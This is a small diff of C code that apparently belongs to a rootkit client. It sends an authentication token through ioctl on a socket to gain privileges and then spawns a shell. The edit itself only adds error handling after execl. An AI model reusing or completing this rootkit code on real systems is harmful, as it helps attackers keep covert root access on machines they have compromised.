@@ -74,7 +74,8 @@ int main ( int argc, char *argv[] )
         rooty_args.cmd = 0;
         io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
         execl(SHELL, "sh", NULL);
-        break;
+        perror("execl");
+        _exit(127);
 
     case 1:
     {
